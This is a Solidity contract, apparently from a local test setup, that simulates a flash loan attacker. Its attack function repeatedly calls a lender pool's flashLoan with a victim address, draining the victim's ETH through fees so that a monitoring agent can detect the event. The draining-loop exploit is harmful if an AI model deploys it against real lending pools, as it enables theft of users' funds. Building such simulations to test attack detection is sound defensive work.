// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * FlashLoanAttacker.sol
 * ======================
 * STAGE 2 — Attacker contract for flash loan simulation
 *
 * PURPOSE:
 *   Simulates a flash loan attacker that exploits NaiveReceiverLenderPool.
 *   Used by scripts/attack.js to trigger a real on-chain flash loan event
 *   that MonitorAgent detects.
 *
 * HOW IT WORKS:
 *   1. Attacker.attack(pool, victim, amount) is called by the test script
 *   2. Calls pool.flashLoan(victim, amount) — drains victim's ETH via fee
 *   3. NaiveReceiverLenderPool emits FlashLoan event
 *   4. MonitorAgent picks up the event within POLL_INTERVAL_SECONDS (1s)
 *   5. THREAT_DETECTED fires → full pipeline activated
 *
 * DEPLOY:
 *   npx hardhat run scripts/deploy.js --network localhost
 */

interface IPool {
    function flashLoan(address receiver, uint256 amount) external;
}

contract FlashLoanAttacker {

    address public owner;

    event AttackLaunched(
        address indexed pool,
        address indexed victim,
        uint256         amount,
        uint256         timestamp
    );

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    /**
     * Execute the flash loan attack.
     * @param pool   address of NaiveReceiverLenderPool
     * @param victim address whose balance will be drained
     * @param amount flash loan amount
     * @param repeat how many times to drain (default 1 for detection test)
     */
    function attack(
        address pool,
        address victim,
        uint256 amount,
        uint256 repeat
    ) external onlyOwner {
        for (uint256 i = 0; i < repeat; i++) {
            IPool(pool).flashLoan(victim, amount);
        }
        emit AttackLaunched(pool, victim, amount, block.timestamp);
    }

    // Receive ETH (needed so pool can send funds here if attacker = receiver)
    receive() external payable {}
}
